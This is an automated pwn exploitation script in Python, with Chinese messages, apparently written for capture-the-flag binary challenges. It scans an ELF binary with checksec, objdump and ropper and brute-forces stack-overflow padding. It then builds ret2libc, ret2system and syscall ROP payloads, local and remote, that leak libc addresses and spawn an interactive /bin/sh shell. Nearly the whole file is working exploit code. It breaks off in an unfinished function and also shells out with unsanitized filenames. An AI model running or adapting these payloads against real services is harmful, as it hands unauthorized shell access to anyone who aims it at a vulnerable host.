from pwn import *
from LibcSearcher import *
import argparse
import sys
import os
import re
import subprocess
from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

def Set_Permission(program):
	os.system("chmod +755 " + program)

def add_current_directory_prefix(program):
    if not program.startswith('./'):
        program = os.path.join('.', program)
    return program

def ldd_libc(program):
	libc_path = None
	
	os.system(f"ldd {program} | awk '{{$1=$1; print}}' > libc_path.txt")

	with open("libc_path.txt", "r") as file:
		for line in file:
			if 'libc.so.6' in line:
				parts = line.split('=>')
				if len(parts) > 1:
					libc_path = parts[1].strip().split()[0]
					print(f"[*]用户没有指定程序动态链接库地址，自动获取，程序 \033[31m{program}\033[0m 的动态链接库地址为: \033[31m{libc_path}\033[0m")
				else:
					print("[*]未找到程序动态链接库地址")
		
	return libc_path


def Information_Collection(program):
	os.system("checksec " + program + " > Information_Collection.txt 2>&1")
	file_path = "Information_Collection.txt"

	with open(file_path, 'r') as f:
		content = f.readlines()
	result = {}
	arch_match = re.search(r"Arch:\s+(\S+)", "".join(content))

	if arch_match:
		arch = arch_match.group(1)
		if '64' in arch:
			result['bit'] = 64
			bit = 64
		elif '32' in arch:
			result['bit'] = 32
			bit = 32

	keys = ['RELRO', 'Stack', 'NX', 'PIE', 'Stripped', 'RWX']
	for key in keys:
		for line in content:
			if key in line:
				result[key] = line.split(":")[1].strip()

	if 'Stack' in result:
		if result['Stack'] == 'No canary found':
			stack = 0
		elif result['Stack'] == 'Canary found':
			stack = 1
		elif result['Stack'] == 'Executable':
			stack = 2

	rwx = 0
	if 'RWX' in result:
		if result['RWX'] == 'Has RWX segments':
			rwx = 1

	pie = None
	if 'PIE' in result:
		if result['PIE'] == 'PIE enabled':
			pie = 1


	for key, value in result.items():
		print(f"\033[31m{key}: {value}\033[0m")

	return stack, rwx, bit ,pie

def find_large_bss_symbols(program):
	function = 0
	with open(program, 'rb') as f:
		elf = ELFFile(f)
	
		symtab = elf.get_section_by_name('.symtab')
		if not symtab:
			print("[*]没有找到可存储shellcode的函数")
			return function
		for symbol in symtab.iter_symbols():
			if (symbol['st_info'].type == 'STT_OBJECT' and
				symbol['st_size'] > 30):
				print(f"[*]找到可存储shellcode的函数: \033[31m{symbol.name}\033[0m, 地址为: \033[31m{hex(symbol['st_value'])}\033[0m")
				function = 1
				buf_addr = hex(symbol['st_value'])
				function_name = symbol.name

		return function, buf_addr , function_name
	

def Objdump_Scan(program):
	os.system("objdump -d " + program + " > Objdump_Scan.txt 2>&1")
	target_functions = ["write", "puts", "printf", "main", "system","backdoor","callsystem"]
	function_addresses = {}
	found_functions = []

	with open("Objdump_Scan.txt", "r") as file:
		lines = file.readlines()

	for line in lines:
		for func in target_functions:
			if f"<{func}@plt>:" in line or f"<{func}>:" in line:
				address = line.split()[0].strip(":")
				function_addresses[func] = address
				found_functions.append(func)
				print(f"{func} 函数存在，地址为: \033[31m{address}\033[0m")
				break

	return function_addresses

def set_Function_Flag():
	target_functions = ["write", "puts", "printf", "main", "system","backdoor","callsystem"]
	function_flags = {func: 0 for func in target_functions}

	with open("Objdump_Scan.txt", "r") as file:
		lines = file.readlines()

	for line in lines:
		for func in target_functions:
			if f"<{func}@plt>:" in line or f"<{func}>:" in line:
				function_flags[func] = 1
				break

	return function_flags

def set_x64_Rop(program):
	os.system("ropper --file " + program + " --search 'pop rdi' > ropper.txt --nocolor 2>&1")
	os.system("ropper --file " + program + " --search 'pop rsi' >> ropper.txt --nocolor 2>&1")
	os.system("ropper --file " + program + " --search 'ret' >> ropper.txt --nocolor 2>&1")

	pop_rdi_addr = None
	pop_rsi_addr = None
	ret_addr = None
	other_rdi_registers = None
	other_rsi_registers = None

	with open("ropper.txt", "r") as file:
		lines = file.readlines()

	for line in lines:
		if '[INFO]' in line:
			continue
		if "pop rdi;" in line and "pop rdi; pop" in line:
			pop_rdi_addr = line.split(":")[0].strip()
			print(f"pop rdi 指令存在，地址为: \033[31m{pop_rdi_addr}\033[0m")
			other_rdi_registers = 1

		elif "pop rdi; ret;" in line:
			pop_rdi_addr = line.split(":")[0].strip()
			print(f"pop rdi 指令存在，地址为: \033[31m{pop_rdi_addr}\033[0m")
			other_rdi_registers = 0

		elif "pop rsi;" in line and "pop rsi; pop" in line:
			pop_rsi_addr = line.split(":")[0].strip()
			print(f"pop rsi 指令存在，地址为: \033[31m{pop_rsi_addr}\033[0m")
			other_rsi_registers = 1

		elif "pop rsi; ret;" in line:
			pop_rsi_addr = line.split(":")[0].strip()
			print(f"pop rsi 指令存在，地址为: \033[31m{pop_rsi_addr}\033[0m")
			other_rsi_registers = 0

		elif "ret" in line and "ret " not in line:
			ret_addr = line.split(":")[0].strip()
			print(f"ret 指令存在，地址为: \033[31m{ret_addr}\033[0m")

	return pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers ,other_rsi_registers

def set_x32_Rop(program):
	pop_eax_addr = None
	pop_ebx_addr = None
	pop_ecx_addr = None
	pop_edx_addr = None
	pop_ecx_ebx_addr = None
	ret_addr = None
	int_0x80 = None
	eax = None
	ebx = None
	ebx = None
	ecx = None
	edx = None

	os.system("ropper --file " + program + " --search 'pop eax;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "pop eax; ret;" in line:
				pop_eax_addr = line.split(":")[0].strip()
				print(f"pop eax 指令存在，地址为: \033[31m{pop_eax_addr}\033[0m")
				eax = 1

	os.system("ropper --file " + program + " --search 'pop ebx;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "pop ebx; ret;" in line:
				pop_ebx_addr = line.split(":")[0].strip()
				print(f"pop ebx 指令存在，地址为: \033[31m{pop_ebx_addr}\033[0m")
				ebx = 1

	os.system("ropper --file " + program + " --search 'pop ecx;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "pop ecx; ret;" in line:
				pop_ecx_addr = line.split(":")[0].strip()
				print(f"pop ecx 指令存在，地址为: \033[31m{pop_ecx_addr}\033[0m")
				ecx = 1
			elif "pop ecx" in line and 'pop ebx' in line:
				pop_ecx_ebx_addr = line.split(":")[0].strip()
				print(f"pop ecx 指令存在，地址为: \033[31m{pop_ecx_ebx_addr}\033[0m")
				ecx = 1

	os.system("ropper --file " + program + " --search 'pop edx;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "pop edx; ret;" in line:
				pop_edx_addr = line.split(":")[0].strip()
				print(f"pop edx 指令存在，地址为: \033[31m{pop_edx_addr}\033[0m")
				edx = 1

	os.system("ropper --file " + program + " --search 'ret;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "ret" in line and "ret " not in line:
				ret_addr = line.split(":")[0].strip()
				print(f"ret 指令存在，地址为: \033[31m{ret_addr}\033[0m")

	os.system("ropper --file " + program + " --search 'int 0x80;' > ropper.txt --nocolor 2>&1")
	with open("ropper.txt", "r") as file:
		lines = file.readlines()
		for line in lines:
			if '[INFO]' in line:
				continue
			if "int 0x80" in line:
				int_0x80 = line.split(":")[0].strip()
				print(f"int 0x80 指令存在，地址为: \033[31m{int_0x80}\033[0m")

	return pop_eax_addr, pop_ebx_addr, pop_ecx_addr,pop_edx_addr , pop_ecx_ebx_addr, ret_addr ,int_0x80, eax ,ebx ,ecx ,edx

def Test_Stack_Overflow(program,bit):
	if bit == 64:
		char = 'A'
		padding = 0

		while True:
			input_data = char * (padding + 1)
			process = subprocess.Popen([program], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			stdout, stderr = process.communicate(input=input_data.encode())

			if process.returncode == -11:
				padding = padding + 8
				print(f"检测到栈溢出漏洞，测试字符数为: \033[31m{padding}\033[0m")
				return padding
			else:
				padding += 1

			if padding > 10000:
				print("未检测到栈溢出漏洞，测试字符数超过 10000")
				padding = 0
				return padding

		return padding
	if bit == 32:
		char = 'A'
		padding = 0

		while True:
			input_data = char * (padding + 1)
			process = subprocess.Popen([program], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			stdout, stderr = process.communicate(input=input_data.encode())

			if process.returncode == -11:
				padding = padding + 4
				print(f"检测到栈溢出漏洞，测试字符数为: \033[31m{padding}\033[0m")
				return padding
			else:
				padding += 1

			if padding > 10000:
				print("未检测到栈溢出漏洞，测试字符数超过 10000")
				padding = 0
				return padding

		return padding

def check_binsh(program):
	os.system('strings ' + program +' | grep "/bin/sh" > check_binsh.txt')
	with open('check_binsh.txt', 'r') as file:
		content = file.read()

	return '/bin/sh' in content

def ret2libc_write_x32(program,libc,padding,libc_path):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	payload1 = asm('nop') * padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(0) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , p64(0), pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr), p64(0), p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr) ,p64(system_addr) , p64(0)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_x64_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port):
	io = remote(url,port)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']
	if other_rsi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)
		print(pop_rdi_addr,pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(0) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 1:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , p64(0), pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	elif other_rdi_registers == 0 and other_rsi_registers == 0:
		pop_rdi_addr = int(pop_rdi_addr, 16)
		pop_rdi_addr = p64(pop_rdi_addr)
		pop_rsi_addr = int(pop_rsi_addr, 16)
		pop_rsi_addr = p64(pop_rsi_addr)

		payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(1) , pop_rsi_addr , p64(write_got) , p64(write_plt) , p64(main_addr)])
		io.recv()
		io.sendline(payload1)

	write_addr = u64(io.recv(8))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr), p64(0), p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr), p64(system_addr) , p64(0)])
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2libc_write_x32_remote(program,libc,padding,url,port):
	io = remote(url,port)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	write_plt = e.symbols['write']
	write_got = e.got['write']

	payload1 = asm('nop') * padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
	io.recv()
	io.sendline(payload1)

	write_addr = u32(io.recv(4))
	print(f'[*]write函数在libc中的地址为: \033[31m{hex(write_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("write",write_addr)
		libcbase = write_addr - libc.dump('write')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31mPWN!!!\033[0m')
	else:
		libc_write = libc.symbols['write']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))
		system_addr = write_addr - libc_write + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = write_addr - libc_write + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')


	payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
	io.recv()
	io.sendline(payload2)
	io.interactive()

def ret2_system_x32(program,libc,padding,libc_path):
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()

	payload = asm('nop') * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)
	io.sendline(payload)
	io.interactive()

def ret2_system_x64(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,libc_path):
	if pop_rdi_addr == None:
		print("pop rdi指令不存在，无法利用")
		sys.exit(0)
	io = process(program)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding , pop_rdi_addr , p64(bin_sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding , pop_rdi_addr , p64(bin_sh_addr), ret_addr,p64(system_addr)])
	io.sendline(payload)
	io.interactive()

def ret2_system_x32_remote(program,libc,padding,url,port):
	io = remote(url,port)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()

	payload = asm('nop') * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)
	io.sendline(payload)
	io.interactive()

def ret2_system_x64_remote(program,libc,padding,pop_rdi_addr,other_rdi_registers,ret_addr,url,port):
	if pop_rdi_addr == None:
		print("pop rdi指令不存在，无法利用")
		sys.exitsystem(0)
	io = remote(url,port)
	e = ELF(program)
	system_addr = e.symbols['system']
	print(f'[*]system函数在程序中的地址为: \033[31m{hex(system_addr)}\033[0m')
	bin_sh_addr = next(e.search(b'/bin/sh'))
	print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
	print('\033[31m[*]PWN!!!\033[0m')
	io.recv()

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload = flat([asm('nop') * padding , pop_rdi_addr , p64(bin_sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	elif other_rdi_registers == 0:
		payload = flat([asm('nop') * padding , pop_rdi_addr , p64(bin_sh_addr), ret_addr,p64(system_addr)])
	io.sendline(payload)
	io.interactive()

def ret2libc_put_x32(program,libc,padding,libc_path):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	payload1 = asm('nop') * padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x32_remote(program,libc,padding,url,port):
	io = remote(url,port)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	payload1 = asm('nop') * padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)
	io.recv()
	io.sendline(payload1)

	puts_addr=u32(io.recvuntil(b'\xf7')[-4:])
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x64_remote(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,url,port):
	io = remote(url,port)
	if libc == 1:
		print('[*]用户未指定libc地址 use LibcSearcherX')
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)

	payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)

	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def ret2libc_put_x64(program,libc,padding,pop_rdi_addr, pop_rsi_addr, ret_addr ,other_rdi_registers ,other_rsi_registers,libc_path):
	io = process(program)
	if libc == 1:
		if libc_path == None:
			print('[*]使用 LibcSearcher')
		else:	
			print('[*]用户未指定libc地址')
			libc = ELF(libc_path)
	else:
		libc = ELF(libc)
	e = ELF(program)
	main_addr = e.symbols['main']
	puts_plt = e.symbols['puts']
	puts_got = e.got['puts']

	pop_rdi_addr = int(pop_rdi_addr, 16)
	pop_rdi_addr = p64(pop_rdi_addr)

	payload1 = flat([asm('nop') * padding , pop_rdi_addr , p64(puts_got), p64(puts_plt) , p64(main_addr)])
	io.recv()
	io.sendline(payload1)

	puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
	print(f'[*]put函数在libc中的地址为: \033[31m{hex(puts_addr)}\033[0m')

	if libc == 1:
		libc = LibcSearcher("puts",puts_addr)
		libcbase = puts_addr - libc.dump('puts')
		libc_system = libc.dump('system')
		libc_sh = libc.dump('str_bin_sh')
		system_addr = libcbase + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = libcbase + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')
	else:

		libc_puts = libc.symbols['puts']
		libc_system = libc.symbols['system']
		libc_sh = next(libc.search(b'/bin/sh'))

		system_addr = puts_addr - libc_puts + libc_system
		print(f'[*]system函数在libc中的地址为: \033[31m{hex(system_addr)}\033[0m')
		sh_addr = puts_addr - libc_puts + libc_sh
		print(f'[*]/bin/sh字符串在libc中的地址为: \033[31m{hex(sh_addr)}\033[0m')
		print('\033[31m[*]PWN!!!\033[0m')

	io.recv()
	ret_addr = int(ret_addr, 16)
	ret_addr = p64(ret_addr)
	if other_rdi_registers == 1:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr), p64(0),ret_addr, p64(system_addr) , p64(0)])
	else:
		payload2 = flat([asm('nop') * padding , pop_rdi_addr , p64(sh_addr) ,ret_addr,p64(system_addr)])
	io.sendline(payload2)
	io.interactive()

def execve_syscall_remote(program,padding,pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr , ret_addr, int_0x80,url,port):
	if pop_ecx_addr == None:
		io = remote(url,port)
		e = ELF(program)
		bin_sh_addr = next(e.search(b'/bin/sh'))
		print(f'[*]/bin/sh字符串在程序中的地址为: \033[31m{hex(bin_sh_addr)}\033[0m')
		pop_eax_addr = int(pop_eax_addr, 16)
		pop_eax_addr = p32(pop_eax_addr)
		pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
		pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
